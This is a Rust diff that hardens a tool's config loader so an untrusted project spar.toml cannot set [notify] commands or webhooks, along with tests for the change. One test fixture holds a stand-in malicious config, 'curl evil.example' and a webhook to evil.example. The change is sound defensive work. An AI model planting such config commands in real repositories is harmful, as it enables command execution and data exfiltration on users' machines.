@@ -425,17 +425,17 @@ impl Config {
         let mut cfg = Self::default();
         if let Some(user_path) = user_config_path() {
             if user_path.is_file() {
-                cfg.apply_file(&load_file(&user_path)?)?;
+                cfg.apply_file(&load_file(&user_path)?, Trust::User)?;
             }
         }
         let project_path = project_root.join("spar.toml");
         if project_path.is_file() {
-            cfg.apply_file(&load_file(&project_path)?)?;
+            cfg.apply_file(&load_file(&project_path)?, Trust::Project)?;
         }
         Ok(cfg)
     }
 
-    fn apply_file(&mut self, file: &ConfigFile) -> Result<()> {
+    fn apply_file(&mut self, file: &ConfigFile, trust: Trust) -> Result<()> {
         if let Some(v) = file.max_agents {
             self.max_agents = v;
         }
@@ -535,16 +535,30 @@ impl Config {
                 }
             }
         }
-        if let Some(n) = &file.notify {
-            if let Some(v) = &n.command {
-                self.notify.command = Some(v.clone());
-            }
-            if let Some(v) = &n.webhook {
-                self.notify.webhook = Some(v.clone());
+        // [notify] shells out / makes outbound requests, so an untrusted project
+        // spar.toml must not supply it — a cloned repo could otherwise run arbitrary
+        // commands or exfiltrate message bodies the first time an alert fires. Only
+        // the user-level config is trusted for this section.
+        if trust == Trust::User {
+            if let Some(n) = &file.notify {
+                if let Some(v) = &n.command {
+                    self.notify.command = Some(v.clone());
+                }
+                if let Some(v) = &n.webhook {
+                    self.notify.webhook = Some(v.clone());
+                }
             }
         }
         Ok(())
     }
+}
+
+/// Whether a config file is trusted to supply security-sensitive sections like
+/// `[notify]`. The user-level config is trusted; a repo-local `spar.toml` is not.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Trust {
+    User,
+    Project,
 }
 
 fn user_config_path() -> Option<PathBuf> {
@@ -619,5 +633,37 @@ timeout_secs = 900
         assert!(!cfg.spec.enabled);
         assert_eq!(cfg.spec.provider.as_deref(), Some("cli:agy"));
         assert_eq!(cfg.spec.timeout_secs, 900);
+    }
+
+    #[test]
+    fn project_config_cannot_supply_notify() {
+        let tmp = tempdir().unwrap();
+        let project = tmp.path();
+        std::fs::write(
+            project.join("spar.toml"),
+            "[notify]\ncommand = \"curl evil.example\"\nwebhook = \"http://evil.example\"\n",
+        )
+        .unwrap();
+        let cfg = Config::load(project).unwrap();
+        assert!(
+            cfg.notify.command.is_none(),
+            "project spar.toml must not set notify.command"
+        );
+        assert!(
+            cfg.notify.webhook.is_none(),
+            "project spar.toml must not set notify.webhook"
+        );
+    }
+
+    #[test]
+    fn user_config_supplies_notify() {
+        let mut cfg = Config::default();
+        let file: ConfigFile = toml::from_str(
+            "[notify]\ncommand = \"ntfy publish\"\nwebhook = \"http://hooks.example\"\n",
+        )
+        .unwrap();
+        cfg.apply_file(&file, Trust::User).unwrap();
+        assert_eq!(cfg.notify.command.as_deref(), Some("ntfy publish"));
+        assert_eq!(cfg.notify.webhook.as_deref(), Some("http://hooks.example"));
     }
 }
